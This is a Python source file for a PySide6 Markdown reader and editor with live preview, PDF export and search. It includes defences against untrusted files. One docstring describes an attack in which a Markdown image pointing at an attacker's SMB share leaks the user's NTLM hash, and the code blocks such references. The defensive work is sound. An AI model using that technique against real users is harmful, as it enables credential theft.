from __future__ import annotations

import codecs
import contextlib
import os
import re
import sys
from pathlib import Path

from PySide6.QtCore import QEvent, QFileSystemWatcher, QObject, QSettings, Qt, QTimer, QUrl, Signal
from PySide6.QtGui import (
    QAction,
    QActionGroup,
    QCloseEvent,
    QDesktopServices,
    QFont,
    QIcon,
    QKeySequence,
    QShortcut,
    QTextCursor,
    QTextDocument,
)
from PySide6.QtPrintSupport import QPrinter
from PySide6.QtWidgets import (
    QApplication,
    QFileDialog,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QMainWindow,
    QMenu,
    QMessageBox,
    QPlainTextEdit,
    QPushButton,
    QSplitter,
    QTextBrowser,
    QToolBar,
    QVBoxLayout,
    QWidget,
)

from markdown_reader import __version__

APP_NAME = "Markdown Reader"
ICON_PATH = Path(__file__).resolve().parent / "assets" / "icon.png"
MARKDOWN_FILTER = "Markdown files (*.md *.markdown *.mdown *.mkd);;All files (*.*)"
MARKDOWN_EXTENSIONS = {".md", ".markdown", ".mdown", ".mkd"}
# Links with these schemes open without a prompt. Anything else (local programs,
# file:// targets, custom protocol handlers) asks first, because a Markdown file
# from an untrusted source could otherwise launch an executable with one click.
SAFE_LINK_SCHEMES = {"http", "https", "mailto"}
# Raw HTML is shown as text rather than interpreted. Qt hands HTML straight to the
# rich text engine, where one unclosed or void tag - the `<img>` inside the centred
# header of a typical README, say - swallows everything after it and leaves the
# preview blank. Showing the tags is worse looking and far better than showing nothing.
MARKDOWN_FEATURES = QTextDocument.MarkdownDialectGitHub | QTextDocument.MarkdownNoHTML
VIEW_MODES = {"split", "preview", "editor"}
MIN_ZOOM, MAX_ZOOM = -6, 20
RENDER_DELAY_MS = 150
DEFAULT_SPLIT = [470, 630]
WELCOME = """# Markdown Reader

Drop a Markdown file anywhere in this window, or use **File → Open** (`Ctrl+O`).

You can read, edit, save, export to PDF, search, and zoom.
"""

PREVIEW_CSS = """
body { font-family: 'Segoe UI', sans-serif; font-size: 11pt; line-height: 1.5;
       color: #24292f; margin: 28px; }
h1, h2 { border-bottom: 1px solid #d0d7de; padding-bottom: 0.3em; }
h1, h2, h3, h4 { color: #1f2328; }
pre, code { font-family: Consolas, monospace; background: #f6f8fa; }
pre { padding: 12px; border: 1px solid #d8dee4; }
blockquote { color: #57606a; border-left: 4px solid #d0d7de; padding-left: 12px; }
table { border-collapse: collapse; }
th, td { border: 1px solid #d0d7de; padding: 6px 12px; }
a { color: #0969da; }
"""


def read_markdown(path: Path) -> tuple[str, str, str]:
    """Return the file's text plus the encoding and line ending to save it back with."""
    raw = path.read_bytes()
    encoding = "utf-8-sig" if raw.startswith(codecs.BOM_UTF8) else "utf-8"
    try:
        text = raw.decode(encoding)
    except UnicodeDecodeError:
        # Older Windows tools often save as Windows-1252; latin-1 accepts any byte.
        encoding = "cp1252"
        try:
            text = raw.decode(encoding)
        except UnicodeDecodeError:
            encoding = "latin-1"
            text = raw.decode(encoding)
    if "\r\n" in text:
        newline = "\r\n"
    elif "\r" in text:
        newline = "\r"  # Classic Mac line endings; keep them instead of rewriting the file.
    else:
        newline = "\n"
    return text.replace("\r\n", "\n").replace("\r", "\n"), encoding, newline


def encoding_label(encoding: str) -> str:
    return {"utf-8": "UTF-8", "utf-8-sig": "UTF-8 BOM", "cp1252": "Windows-1252", "latin-1": "Latin-1"}.get(
        encoding, encoding
    )


def newline_label(newline: str) -> str:
    return {"\r\n": "CRLF", "\r": "CR", "\n": "LF"}.get(newline, "LF")


def heading_slug(text: str) -> str:
    """Turn heading text into the anchor GitHub would generate for it."""
    slug = re.sub(r"[^\w\- ]+", "", text.strip().lower(), flags=re.UNICODE)
    return re.sub(r"\s+", "-", slug)


def add_heading_anchors(document: QTextDocument) -> None:
    """Give every heading an anchor name so in-document "#heading" links can jump to it.

    Qt renders Markdown without heading anchors, so a table of contents built from
    [Section](#section) links silently did nothing.
    """
    seen: dict[str, int] = {}
    block = document.begin()
    while block.isValid():
        if block.blockFormat().headingLevel():
            slug = heading_slug(block.text())
            if slug:
                count = seen.get(slug, 0)
                seen[slug] = count + 1
                names = [slug if count == 0 else f"{slug}-{count}"]
                cursor = QTextCursor(block)
                cursor.movePosition(QTextCursor.MoveOperation.EndOfBlock, QTextCursor.MoveMode.KeepAnchor)
                fmt = cursor.charFormat()
                fmt.setAnchor(True)
                fmt.setAnchorNames(names)
                cursor.mergeCharFormat(fmt)
        block = block.next()


class PreviewBrowser(QTextBrowser):
    """Preview pane that refuses to fetch anything off the machine.

    Qt resolves image paths on its own, so a Markdown file containing
    ``![](//attacker/share/pixel.png)`` made Windows open an SMB connection to
    that host and offer the current user's NTLM credentials - a tracking pixel
    that leaks a password hash, triggered just by previewing an untrusted file.
    Only plain local paths are loaded now; UNC and network references are
    dropped, and each one reports itself so the status bar can say so.
    """

    resource_blocked = Signal()

    def __init__(self, parent: QWidget | None = None) -> None:
        super().__init__(parent)
        self.blocked_resources = 0

    def loadResource(self, resource_type: int, name: QUrl):  # noqa: N802
        if self._is_allowed(name):
            return super().loadResource(resource_type, name)
        self.blocked_resources += 1
        self.resource_blocked.emit()
        return None

    @staticmethod
    def _is_allowed(name: QUrl) -> bool:
        if name.isEmpty() or name.scheme() == "data":
            return True
        if name.host():
            # A host means a UNC path (file://server/share) or a remote URL.
            return False
        if name.scheme() and not name.isLocalFile():
            return False
        local = name.toLocalFile() if name.isLocalFile() else name.path()
        return not local.startswith(("//", "\\\\"))


class MarkdownWindow(QMainWindow):
    def __init__(self, initial_path: str | None = None) -> None:
        super().__init__()
        self.setWindowIcon(QIcon(str(ICON_PATH)))
        self.settings = QSettings("HermesTools", APP_NAME)
        self.current_path: Path | None = None
        self.encoding = "utf-8"
        self.newline = "\n"
        self.dirty = False
        self.last_find = ""
        self.view_mode = "split"
        self._zoom = 0
        self._updating_editor = False
        self._reload_prompt_open = False
        self._word_count = 0
        self._split_sizes = self._stored_split_sizes()

        self._render_timer = QTimer(self)
        self._render_timer.setSingleShot(True)
        self._render_timer.setInterval(RENDER_DELAY_MS)
        self._render_timer.timeout.connect(self._render_editor)

        self.watcher = QFileSystemWatcher(self)
        self.watcher.fileChanged.connect(self._on_file_changed)

        self.setAcceptDrops(True)
        self.resize(1100, 760)
        self.setMinimumSize(700, 480)
        self._build_ui()
        self._build_actions()
        self._build_menus()
        self._build_toolbar()
        self._restore_settings()
        self._show_welcome()

        if initial_path:
            QTimer.singleShot(0, lambda: self.open_path(Path(initial_path)))

    def _build_ui(self) -> None:
        root = QWidget(self)
        layout = QVBoxLayout(root)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        self.splitter = QSplitter(Qt.Orientation.Horizontal)
        self.editor = QPlainTextEdit()
        # QPlainTextEdit accepts text drops by default, which prevents file drops
        # over the editor from reaching MarkdownWindow.dropEvent.
        self.editor.setAcceptDrops(False)
        self.editor.setPlaceholderText("Open or drop a Markdown file, then edit its source here…")
        self.editor.setLineWrapMode(QPlainTextEdit.LineWrapMode.WidgetWidth)
        self.editor.setFont(QFont("Consolas", 11))
        self.editor.textChanged.connect(self._on_text_changed)
        self.editor.cursorPositionChanged.connect(self._update_position)

        self.preview = PreviewBrowser()
        # QTextBrowser also accepts drops by default; let the main window handle
        # them so dropping works across both panes.
        self.preview.setAcceptDrops(False)
        self.preview.setOpenLinks(False)
        self.preview.anchorClicked.connect(self._open_link)
        # Images are fetched during layout, after _render returns, so let the pane say so.
        self.preview.resource_blocked.connect(self._report_blocked_resources)
        self.preview.document().setDefaultStyleSheet(PREVIEW_CSS)

        # Ctrl+wheel would otherwise zoom one pane on its own and bypass the zoom level.
        self.editor.viewport().installEventFilter(self)
        self.preview.viewport().installEventFilter(self)

        self.splitter.addWidget(self.editor)
        self.splitter.addWidget(self.preview)
        self.splitter.setSizes(self._split_sizes)
        self.splitter.splitterMoved.connect(self._remember_split)
        layout.addWidget(self.splitter, 1)

        self.find_bar = QWidget()
        find_layout = QHBoxLayout(self.find_bar)
        find_layout.setContentsMargins(8, 5, 8, 5)
        find_layout.addWidget(QLabel("Find:"))
        self.find_input = QLineEdit()
        self.find_input.setClearButtonEnabled(True)
        self.find_input.setPlaceholderText("Enter: next  ·  Shift+Enter: previous  ·  Esc: close")
        self.find_input.returnPressed.connect(self.find_next)
        find_layout.addWidget(self.find_input, 1)
        previous = QPushButton("Previous")
        previous.clicked.connect(self.find_previous)
        find_layout.addWidget(previous)
        next_button = QPushButton("Next")
        next_button.clicked.connect(self.find_next)
        find_layout.addWidget(next_button)
        close_button = QPushButton("Close")
        close_button.clicked.connect(self.hide_find)
        find_layout.addWidget(close_button)
        QShortcut(QKeySequence("Shift+Return"), self.find_input, self.find_previous)
        escape = QShortcut(QKeySequence.StandardKey.Cancel, self.find_bar, self.hide_find)
        escape.setContext(Qt.ShortcutContext.WidgetWithChildrenShortcut)
        self.find_bar.hide()
        layout.addWidget(self.find_bar)

        self.setCentralWidget(root)
        self.position_label = QLabel()
        self.statusBar().addPermanentWidget(self.position_label)
        self.statusBar().showMessage("Drop a Markdown file here to open it")

    def _action(self, text: str, slot, shortcut: str | QKeySequence | None = None) -> QAction:
        action = QAction(text, self)
        action.triggered.connect(slot)
        if shortcut:
            action.setShortcut(shortcut)
            native = action.shortcut().toString(QKeySequence.SequenceFormat.NativeText)
            action.setToolTip(f"{text.replace('&', '').rstrip('…')} ({native})")
        return action

    def _build_actions(self) -> None:
        self.new_action = self._action("&New", self.new_document, QKeySequence.StandardKey.New)
        self.open_action = self._action("&Open…", self.open_dialog, QKeySequence.StandardKey.Open)
        self.close_action = self._action("&Close File", self.close_document, "Ctrl+W")
        self.save_action = self._action("&Save", self.save, QKeySequence.StandardKey.Save)
        self.save_as_action = self._action("Save &As…", self.save_as, QKeySequence.StandardKey.SaveAs)
        self.pdf_action = self._action("Export as &PDF…", self.export_pdf, QKeySequence.StandardKey.Print)
        self.exit_action = self._action("E&xit", self.close, QKeySequence.StandardKey.Quit)

        self.undo_action = self._action("&Undo", self.editor.undo, QKeySequence.StandardKey.Undo)
        self.redo_action = self._action("&Redo", self.editor.redo, QKeySequence.StandardKey.Redo)
        self.cut_action = self._action("Cu&t", self.editor.cut, QKeySequence.StandardKey.Cut)
        self.copy_action = self._action("&Copy", self.copy, QKeySequence.StandardKey.Copy)
        self.paste_action = self._action("&Paste", self.editor.paste, QKeySequence.StandardKey.Paste)
        self.select_all_action = self._action("Select &All", self.select_all, QKeySequence.StandardKey.SelectAll)
        self.find_action = self._action("&Find…", self.show_find, QKeySequence.StandardKey.Find)
        self.find_next_action = self._action("Find &Next", self.find_next, QKeySequence.StandardKey.FindNext)
        self.find_previous_action = self._action(
            "Find Pre&vious", self.find_previous, QKeySequence.StandardKey.FindPrevious
        )

        self.zoom_in_action = self._action("Zoom &In", self.zoom_in, QKeySequence.StandardKey.ZoomIn)
        self.zoom_out_action = self._action("Zoom &Out", self.zoom_out, QKeySequence.StandardKey.ZoomOut)
        self.zoom_reset_action = self._action("&Reset Zoom", self.zoom_reset, "Ctrl+0")

        self.view_group = QActionGroup(self)
        self.view_group.setExclusive(True)
        self.split_action = self._view_action("&Split View", "split", "Ctrl+1", True)
        self.preview_action = self._view_action("&Preview Only", "preview", "Ctrl+2")
        self.edit_action = self._view_action("&Editor Only", "editor", "Ctrl+3")

        self.about_action = self._action("&About", self.about)

    def _view_action(self, text: str, mode: str, shortcut: str, checked: bool = False) -> QAction:
        action = QAction(text, self)
        action.setCheckable(True)
        action.setChecked(checked)
        action.setShortcut(shortcut)
        action.setToolTip(f"{text.replace('&', '')} ({shortcut})")
        action.triggered.connect(lambda _checked=False, value=mode: self.set_view(value))
        self.view_group.addAction(action)
        return action

    def _build_menus(self) -> None:
        file_menu = self.menuBar().addMenu("&File")
        file_menu.addActions([self.new_action, self.open_action])
        self.recent_menu = QMenu("Open &Recent", self)
        self.recent_menu.setToolTipsVisible(True)
        file_menu.addMenu(self.recent_menu)
        file_menu.addSeparator()
        file_menu.addActions([self.close_action, self.save_action, self.save_as_action])
        file_menu.addSeparator()
        file_menu.addAction(self.pdf_action)
        file_menu.addSeparator()
        file_menu.addAction(self.exit_action)

        edit_menu = self.menuBar().addMenu("&Edit")
        edit_menu.addActions([self.undo_action, self.redo_action])
        edit_menu.addSeparator()
        edit_menu.addActions([self.cut_action, self.copy_action, self.paste_action, self.select_all_action])
        edit_menu.addSeparator()
        edit_menu.addActions([self.find_action, self.find_next_action, self.find_previous_action])

        view_menu = self.menuBar().addMenu("&View")
        view_menu.addActions([self.split_action, self.preview_action, self.edit_action])
        view_menu.addSeparator()
        view_menu.addActions([self.zoom_in_action, self.zoom_out_action, self.zoom_reset_action])

        help_menu = self.menuBar().addMenu("&Help")
        help_menu.addAction(self.about_action)
        self._refresh_recent_menu()

    def _build_toolbar(self) -> None:
        toolbar = QToolBar("Main toolbar", self)
        toolbar.setObjectName("mainToolbar")
        toolbar.setMovable(False)
        self.addToolBar(toolbar)
        toolbar.addActions([self.open_action, self.save_action, self.pdf_action])
        toolbar.addSeparator()
        toolbar.addActions([self.split_action, self.preview_action, self.edit_action])
        toolbar.addSeparator()
        toolbar.addActions([self.zoom_out_action, self.zoom_in_action, self.zoom_reset_action])

    def _stored_split_sizes(self) -> list[int]:
        stored = self.settings.value("splitSizes")
        with contextlib.suppress(TypeError, ValueError):
            sizes = [int(size) for size in stored or []]
            if len(sizes) == 2 and all(size >= 0 for size in sizes) and sum(sizes) > 0:
                return sizes
        return list(DEFAULT_SPLIT)

    def _remember_split(self, *_args) -> None:
        # Only meaningful while both panes are visible; a hidden pane reports 0.
        if self.view_mode == "split":
            self._split_sizes = self.splitter.sizes()

    def _restore_settings(self) -> None:
        geometry = self.settings.value("geometry")
        if geometry:
            self.restoreGeometry(geometry)
        state = self.settings.value("windowState")
        if state:
            self.restoreState(state)
        self.set_view(str(self.settings.value("viewMode", "split")))
        with contextlib.suppress(TypeError, ValueError):
            self._set_zoom(int(self.settings.value("zoom", 0)))
        self.statusBar().clearMessage()

    def _show_welcome(self) -> None:
        self._render_timer.stop()
        self._watch(None)
        self.current_path = None
        self.encoding, self.newline = "utf-8", "\n"
        self._updating_editor = True
        self.editor.clear()
        self._updating_editor = False
        self._render(WELCOME)
        self.dirty = False
        self._update_title()
        self._update_position()

    def _render(self, text: str, keep_scroll: bool = False) -> None:
        bar = self.preview.verticalScrollBar()
        scroll = bar.value()
        document = self.preview.document()
        if self.current_path:
            document.setBaseUrl(QUrl.fromLocalFile(str(self.current_path.parent) + "/"))
        else:
            document.setBaseUrl(QUrl())
        self.preview.blocked_resources = 0
        document.setMarkdown(text, MARKDOWN_FEATURES)
        add_heading_anchors(document)
        # Re-rendering resets the preview to the top; keep the reader's place while typing.
        bar.setValue(scroll if keep_scroll else 0)
        self._word_count = len(text.split())

    def _report_blocked_resources(self) -> None:
        blocked = self.preview.blocked_resources
        if blocked:
            self.statusBar().showMessage(
                f"Blocked {blocked} off-machine reference{'s' if blocked > 1 else ''} in this document", 8000
            )

    def _render_editor(self) -> None:
        self._render_timer.stop()
        self._render(self.editor.toPlainText(), keep_scroll=True)
        self._update_position()

    def _on_text_changed(self) -> None:
        if self._updating_editor:
            return
        if not self.dirty:
            self.dirty = True
            self._update_title()
        self._render_timer.start()

    def _update_title(self) -> None:
        name = self.current_path.name if self.current_path else "Untitled"
        marker = " *" if self.dirty else ""
        self.setWindowTitle(f"{name}{marker} — {APP_NAME}")

    def _update_position(self) -> None:
        cursor = self.editor.textCursor()
        # The word count comes from the last render; counting the whole document on
        # every cursor move made arrow keys crawl in large files.
        self.position_label.setText(
            f"Ln {cursor.blockNumber() + 1}, Col {cursor.positionInBlock() + 1}   ·   "
            f"{self._word_count:,} words   ·   {encoding_label(self.encoding)}   ·   "
            f"{newline_label(self.newline)}  "
        )

    def _dialog_directory(self) -> Path:
        if self.current_path:
            return self.current_path.parent
        return Path(str(self.settings.value("lastDirectory", str(Path.home()))))

    def new_document(self) -> None:
        if not self._confirm_discard():
            return
        self._show_welcome()
        self._render("")
        if self.view_mode == "preview":
            self.set_view("split")
        self.editor.setFocus()
        self.statusBar().showMessage("New document", 3000)

    def open_dialog(self) -> None:
        start = str(self._dialog_directory())
        filename, _ = QFileDialog.getOpenFileName(self, "Open Markdown", start, MARKDOWN_FILTER)
        if filename:
            self.open_path(Path(filename))

    def open_path(self, path: Path) -> bool:
        path = path.expanduser().resolve()
        if not path.is_file():
            QMessageBox.warning(self, APP_NAME, f"File not found:\n{path}")
            return False
        if not self._confirm_discard():
            return False
        try:
            text, encoding, newline = read_markdown(path)
        except OSError as exc:
            QMessageBox.critical(self, APP_NAME, f"Could not open the file:\n{exc}")
            return False

        self.current_path = path
        self._load(text, encoding, newline)
        self.settings.setValue("lastDirectory", str(path.parent))
        self._add_recent(path)
        self._watch(path)
        self.statusBar().showMessage(f"Opened {path}", 5000)
        return True

    def _load(self, text: str, encoding: str, newline: str, keep_scroll: bool = False) -> None:
        self._render_timer.stop()
        self.encoding, self.newline = encoding, newline
        self._updating_editor = True
        self.editor.setPlainText(text)
        self._updating_editor = False
        self.dirty = False
        self._render(text, keep_scroll)
        self.editor.document().setModified(False)
        self._update_title()
        self._update_position()

    def close_document(self) -> None:
        if self._confirm_discard():
            self._show_welcome()
            self.statusBar().showMessage("File closed", 3000)

    def save(self) -> bool:
        if self.current_path is None:
            return self.save_as()
        return self._write_to(self.current_path)

    def save_as(self) -> bool:
        suggested = str(self.current_path or (self._dialog_directory() / "document.md"))
        filename, _ = QFileDialog.getSaveFileName(self, "Save Markdown As", suggested, MARKDOWN_FILTER)
        if not filename:
            return False
        path = Path(filename)
        if not path.suffix:
            path = path.with_suffix(".md")
        return self._write_to(path)

    def _write_to(self, path: Path) -> bool:
        text = self.editor.toPlainText()
        note = ""
        # Write a sibling temp file and swap it in, so a save that fails halfway
        # (full disk, lost network share) leaves the original file intact.
        temp = path.with_name(f".{path.name}.saving")
        # QFileSystemWatcher keeps a handle on the watched file, and on Windows that
        # makes the swap fail with "access is denied"; stop watching until it is done.
        self._watch(None)
        try:
            try:
                temp.write_text(text, encoding=self.encoding, newline=self.newline)
            except UnicodeEncodeError:
                # The user typed characters the original legacy encoding cannot hold.
                note = f" (converted from {encoding_label(self.encoding)} to UTF-8)"
                self.encoding = "utf-8"
                temp.write_text(text, encoding=self.encoding, newline=self.newline)
            os.replace(temp, path)
        except OSError as exc:
            with contextlib.suppress(OSError):
                temp.unlink(missing_ok=True)
            self._watch(self.current_path)
            QMessageBox.critical(self, APP_NAME, f"Could not save the file:\n{exc}")
            return False
        self.current_path = path.resolve()
        self.dirty = False
        self.editor.document().setModified(False)
        self._render(text, keep_scroll=True)
        self.settings.setValue("lastDirectory", str(self.current_path.parent))
        self._add_recent(self.current_path)
        self._watch(self.current_path)
        self._update_title()
        self._update_position()
        self.statusBar().showMessage(f"Saved {self.current_path}{note}", 5000)
        return True

    def _watch(self, path: Path | None) -> None:
        if self.watcher.files():
            self.watcher.removePaths(self.watcher.files())
        if path is not None:
            self.watcher.addPath(str(path))

    def _on_file_changed(self, name: str) -> None:
        path = self.current_path
        if path is None or Path(name) != path or self._reload_prompt_open:
            return
        if not path.exists():
            # Many editors save by replacing the file, which drops the watch; check again shortly.
            QTimer.singleShot(300, lambda: path.exists() and self._rewatch_and_reload(path))
            return
        self._rewatch_and_reload(path)

    def _rewatch_and_reload(self, path: Path) -> None:
        if path != self.current_path:
            return
        if str(path) not in self.watcher.files():
            self.watcher.addPath(str(path))
        try:
            text, encoding, newline = read_markdown(path)
        except OSError:
            return
        if text == self.editor.toPlainText():
            return  # Our own save, or a change that did not touch the content.
        if self.dirty:
            self._reload_prompt_open = True
            try:
                answer = QMessageBox.question(
                    self,
                    "File changed on disk",
                    f'"{path.name}" was changed by another program.\n\nReload it and discard your unsaved changes?',
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                    QMessageBox.StandardButton.No,
                )
            finally:
                self._reload_prompt_open = False
            if answer != QMessageBox.StandardButton.Yes:
                return
        self._load(text, encoding, newline, keep_scroll=True)
        self.statusBar().showMessage(f"Reloaded {path.name} after it changed on disk", 5000)

    def export_pdf(self) -> None:
        if self._render_timer.isActive():
            self._render_editor()
        if self.current_path:
            suggested = self.current_path.with_suffix(".pdf")
        else:
            suggested = self._dialog_directory() / "document.pdf"
        filename, _ = QFileDialog.getSaveFileName(self, "Export PDF", str(suggested), "PDF files (*.pdf)")
        if not filename:
            return
        path = Path(filename)
        if path.suffix.lower() != ".pdf":
            path = path.with_suffix(".pdf")
        try:
            printer = QPrinter(QPrinter.PrinterMode.HighResolution)
            printer.setOutputFormat(QPrinter.OutputFormat.PdfFormat)
            printer.setOutputFileName(str(path))
            printer.setDocName(self.current_path.name if self.current_path else "Markdown document")
            self.preview.document().print_(printer)
        except Exception as exc:
            QMessageBox.critical(self, APP_NAME, f"Could not export the PDF:\n{exc}")
            return
        self.statusBar().showMessage(f"Exported PDF to {path}", 7000)

    def _confirm_discard(self) -> bool:
        if not self.dirty:
            return True
        name = self.current_path.name if self.current_path else "Untitled"
        result = QMessageBox.question(
            self,
            "Unsaved changes",
            f'Save changes to "{name}" before continuing?',
            QMessageBox.StandardButton.Save | QMessageBox.StandardButton.Discard | QMessageBox.StandardButton.Cancel,
            QMessageBox.StandardButton.Save,
        )
        if result == QMessageBox.StandardButton.Cancel:
            return False
        if result == QMessageBox.StandardButton.Save:
            return self.save()
        return True

    def set_view(self, mode: str) -> None:
        if mode not in VIEW_MODES:
            return
        self.view_mode = mode
        self.editor.setVisible(mode in {"split", "editor"})
        self.preview.setVisible(mode in {"split", "preview"})
        self.split_action.setChecked(mode == "split")
        self.preview_action.setChecked(mode == "preview")
        self.edit_action.setChecked(mode == "editor")
        if mode == "split":
            # Restore where the reader left the divider instead of resetting it.
            self.splitter.setSizes(self._split_sizes)
        self.statusBar().showMessage(f"{mode.title()} view", 2000)

    def zoom_in(self) -> None:
        self._set_zoom(self._zoom + 1)

    def zoom_out(self) -> None:
        self._set_zoom(self._zoom - 1)

    def zoom_reset(self) -> None:
        self._set_zoom(0)

    def _set_zoom(self, level: int) -> None:
        level = max(MIN_ZOOM, min(MAX_ZOOM, level))
        delta = level - self._zoom
        if delta > 0:
            self.preview.zoomIn(delta)
            self.editor.zoomIn(delta)
        elif delta < 0:
            self.preview.zoomOut(-delta)
            self.editor.zoomOut(-delta)
        self._zoom = level
        self.statusBar().showMessage(f"Zoom: {100 + self._zoom * 10}%", 2000)

    def eventFilter(self, watched: QObject, event: QEvent) -> bool:  # noqa: N802
        if event.type() == QEvent.Type.Wheel and event.modifiers() & Qt.KeyboardModifier.ControlModifier:
            step = event.angleDelta().y()
            if step:
                self._set_zoom(self._zoom + (1 if step > 0 else -1))
            return True
        return super().eventFilter(watched, event)

    def _find_target(self) -> QPlainTextEdit | QTextBrowser:
        # In preview-only view the editor is hidden, so search what the reader can see.
        return self.preview if self.editor.isHidden() else self.editor

    def show_find(self) -> None:
        selected = self._find_target().textCursor().selectedText()
        if selected:
            self.find_input.setText(selected)
        elif self.last_find:
            self.find_input.setText(self.last_find)
        self.find_bar.show()
        self.find_input.setFocus()
        self.find_input.selectAll()

    def hide_find(self) -> None:
        self.find_bar.hide()
        self._find_target().setFocus()

    def find_next(self) -> None:
        self._find(backward=False)

    def find_previous(self) -> None:
        self._find(backward=True)

    def _find(self, backward: bool) -> None:
        term = self.find_input.text() or self.last_find
        if not term:
            self.show_find()
            return
        self.last_find = term
        target = self._find_target()
        flags = QTextDocument.FindFlag.FindBackward if backward else QTextDocument.FindFlag(0)
        if not target.find(term, flags):
            cursor = target.textCursor()
            cursor.movePosition(cursor.MoveOperation.End if backward else cursor.MoveOperation.Start)
            target.setTextCursor(cursor)
            if not target.find(term, flags):
                self.statusBar().showMessage(f'No matches for "{term}"', 3000)

    def copy(self) -> None:
        focused = QApplication.focusWidget()
        if focused is self.preview:
            self.preview.copy()
        else:
            self.editor.copy()

    def select_all(self) -> None:
        focused = QApplication.focusWidget()
        if focused is self.preview:
            self.preview.selectAll()
        else:
            self.editor.selectAll()

    def _open_link(self, url: QUrl) -> None:
        if not url.scheme() and not url.path() and url.hasFragment():
            self.preview.scrollToAnchor(url.fragment())
            return
        if url.isRelative():
            if not self.current_path:
                self.statusBar().showMessage("Save the document first to follow relative links", 4000)
                return
            target = QUrl.fromLocalFile(str((self.current_path.parent / url.path()).resolve()))
            if url.hasQuery():
                target.setQuery(url.query())
            if url.hasFragment():
                target.setFragment(url.fragment())
            url = target

        if url.isLocalFile():
            path = Path(url.toLocalFile())
            if path.suffix.lower() in MARKDOWN_EXTENSIONS and path.is_file():
                if self.open_path(path) and url.hasFragment():
                    self.preview.scrollToAnchor(url.fragment())
                return
            if not path.exists():
                QMessageBox.warning(self, APP_NAME, f"The linked file does not exist:\n{path}")
                return
            if not self._confirm_external(f"This link opens a file outside {APP_NAME}:\n\n{path}"):
                return
        elif url.scheme().lower() not in SAFE_LINK_SCHEMES:
            if not self._confirm_external(f'This link uses the "{url.scheme()}:" protocol:\n\n{url.toString()}'):
                return
        QDesktopServices.openUrl(url)

    def _confirm_external(self, message: str) -> bool:
        answer = QMessageBox.warning(
            self,
            "Open link?",
            f"{message}\n\nOnly continue if you trust this document. Open it with its default program?",
            QMessageBox.StandardButton.Open | QMessageBox.StandardButton.Cancel,
            QMessageBox.StandardButton.Cancel,
        )
        return answer == QMessageBox.StandardButton.Open

    def _recent_paths(self) -> list[str]:
        value = self.settings.value("recentFiles", [])
        if isinstance(value, str):
            return [value]
        return list(value or [])

    def _add_recent(self, path: Path) -> None:
        value = str(path)
        paths = [item for item in self._recent_paths() if item != value and Path(item).exists()]
        paths.insert(0, value)
        self.settings.setValue("recentFiles", paths[:10])
        self._refresh_recent_menu()

    def _refresh_recent_menu(self) -> None:
        self.recent_menu.clear()
        paths = [item for item in self._recent_paths() if Path(item).exists()]
        if not paths:
            empty = self.recent_menu.addAction("No recent files")
            empty.setEnabled(False)
            return
        for number, item in enumerate(paths, start=1):
            path = Path(item)
            mnemonic = f"&{number}" if number < 10 else "1&0"
            action = self.recent_menu.addAction(f"{mnemonic}  {path.name}    ({path.parent.name or path.parent})")
            action.setToolTip(item)
            action.triggered.connect(lambda _checked=False, p=item: self.open_path(Path(p)))
        self.recent_menu.addSeparator()
        self.recent_menu.addAction("Clear Recent Files", self._clear_recent)

    def _clear_recent(self) -> None:
        self.settings.remove("recentFiles")
        self._refresh_recent_menu()

    def dragEnterEvent(self, event) -> None:  # noqa: N802
        urls = event.mimeData().urls()
        if any(Path(url.toLocalFile()).suffix.lower() in MARKDOWN_EXTENSIONS for url in urls):
            event.acceptProposedAction()

    def dropEvent(self, event) -> None:  # noqa: N802
        for url in event.mimeData().urls():
            path = Path(url.toLocalFile())
            if path.suffix.lower() in MARKDOWN_EXTENSIONS:
                self.open_path(path)
                event.acceptProposedAction()
                return

    def about(self) -> None:
        QMessageBox.about(
            self,
            f"About {APP_NAME}",
            f"<b>{APP_NAME} {__version__}</b><br><br>"
            "A small native Markdown reader and editor with live preview, "
            "drag-and-drop, PDF export, search, and zoom.",
        )

    def closeEvent(self, event: QCloseEvent) -> None:  # noqa: N802
        if not self._confirm_discard():
            event.ignore()
            return
        self.settings.setValue("geometry", self.saveGeometry())
        self.settings.setValue("windowState", self.saveState())
        self.settings.setValue("viewMode", self.view_mode)
        self.settings.setValue("zoom", self._zoom)
        self._remember_split()
        self.settings.setValue("splitSizes", [str(size) for size in self._split_sizes])
        event.accept()


def main() -> int:
    app = QApplication(sys.argv)
    app.setApplicationName(APP_NAME)
    app.setOrganizationName("HermesTools")
    app.setWindowIcon(QIcon(str(ICON_PATH)))
    app.setStyle("Fusion")
    initial_path = sys.argv[1] if len(sys.argv) > 1 else None
    window = MarkdownWindow(initial_path)
    window.show()
    return app.exec()


if __name__ == "__main__":
    raise SystemExit(main())
